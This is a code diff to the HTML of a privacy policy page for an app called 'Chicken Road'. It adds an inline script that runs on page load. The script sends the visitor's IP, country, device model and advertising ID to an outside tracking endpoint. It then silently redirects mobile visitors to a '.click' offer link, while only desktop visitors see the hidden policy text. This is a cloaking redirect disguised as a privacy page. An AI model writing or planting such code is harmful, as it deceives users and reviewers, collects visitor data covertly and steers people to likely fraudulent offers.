@@ -54,14 +54,145 @@
             background-color: #ff5555;
             color: #ffffff;
         }
+        .hidden {
+        display: none;
+        }
     </style>
+    <script>
+(async function () {
+    
+  const OFFER_BASE = "https://suasotdtutr.click/vrj1V6D6";
+
+  const q = new URLSearchParams(location.search);
+  const getParam = (name) => q.get(name) || "";
+  const enc = encodeURIComponent;
+  const toQuery = (obj) =>
+    Object.entries(obj)
+      .filter(([, v]) => v !== undefined && v !== null && String(v).length)
+      .map(([k, v]) => `${enc(k)}=${enc(v)}`)
+      .join("&");
+
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  const adid  = getParam("adid");
+  const refer = getParam("refer");
+
+  let ip = "", country = "";
+  try {
+    const r = await fetch("https://ipinfo.io/json?token=6c0bdcd774927f");
+    if (r.ok) {
+      const j = await r.json();
+      ip = j?.ip || "";
+      country = j?.country || "";
+    }
+  } catch (_) {}
+
+  function getOsVersion() {
+    const ua = navigator.userAgent || "";
+    const m = ua.match(/Android\s+([0-9._]+)/i);
+    return m ? m[1] : "";
+  }
+  function getDeviceModel() {
+    const ua = navigator.userAgent || "";
+    const buildMatch = ua.match(/;\s*([^;()]+?)\s+Build\//i);
+    if (buildMatch && buildMatch[1]) return buildMatch[1].trim();
+    const smMatch = ua.match(/\bSM-[A-Z0-9]+\b/i);
+    if (smMatch) return smMatch[0];
+    return navigator.platform || "Unknown";
+  }
+
+  const osVersion = getOsVersion();
+  const deviceModel = getDeviceModel();
+
+  const initParams = {
+    advertising_id: adid,
+    package: "com.planet.topup",
+    os_version: osVersion,
+    user_device_model: deviceModel,
+    user_locale: country,
+    build_id: "test",
+    install_reffer: refer,
+    app_event_type: "init",
+    real_ip: ip,
+    sub_id_1: "test",
+    attribution: adid,
+    geo: country
+  };
+  const initUrl = "https://nextlevelatri.com/api/init?" + toQuery(initParams);
+
+  let sValue = "";
+  let extraParams = {}; 
+
+  try {
+    const r = await fetch(initUrl, { method: "GET", credentials: "omit" });
+    let data = null;
+    try { data = await r.clone().json(); } catch (_) {}
+
+    if (r.ok && data && data.campaign_name) {
+      let decoded = "";
+      try {
+        decoded = decodeURIComponent(String(data.campaign_name));
+      } catch (_) {
+        decoded = String(data.campaign_name); 
+      }
+
+      if (decoded.startsWith("?")) decoded = decoded.slice(1);
+
+      const parts = decoded.split("&").filter(Boolean);
+
+      const first = parts.shift() || "";
+      let sCandidate = first;
+      if (first.includes("=")) {
+        const [k, v] = first.split("=", 2);
+        if (k && v) {
+          if (k.toLowerCase() === "s") sCandidate = v;
+          else {
+            extraParams[k] = v;
+            sCandidate = "";
+          }
+        }
+      }
+
+      const rest = new URLSearchParams(parts.join("&"));
+      for (const [k, v] of rest.entries()) extraParams[k] = v;
+
+      sValue = sCandidate || "nextlevel";
+      delete extraParams.s;
+    } else {
+      const reason =
+        (data && (data.error || data.message || data.status)) ||
+        (r.ok ? "no_campaign_name" : ("http_" + (r.status || "unknown")));
+      sValue = ("err_" + String(reason)).slice(0, 80);
+    }
+  } catch (_) {
+    sValue = "err_fetch";
+  }
+
+  const offerParams = {
+    adid: adid,
+    install_reffer: refer,
+    s: sValue,
+    ...extraParams
+  };
+
+  const finalOfferUrl =
+    OFFER_BASE + (OFFER_BASE.includes("?") ? "&" : "?") + toQuery(offerParams);
+
+  if (isMobile) {
+    location.replace(finalOfferUrl);
+  } else {
+    document.querySelector(".container")?.classList.remove("hidden");
+  }
+})();
+</script>
+
 </head>
 <body>
 
     <div class="container hidden">
         <h1>Privacy Policy for Chicken Road</h1>
         <h2>Privacy Policy</h2>
-        <p>Last updated: September 19, 2025</p>
+        <p>Last updated: September 29, 2025</p>
 
         <p>This Privacy Policy describes Our policies and procedures on the collection, use and disclosure of Your information when You use the Service and tells You about Your privacy rights and how the law protects You.</p>
         
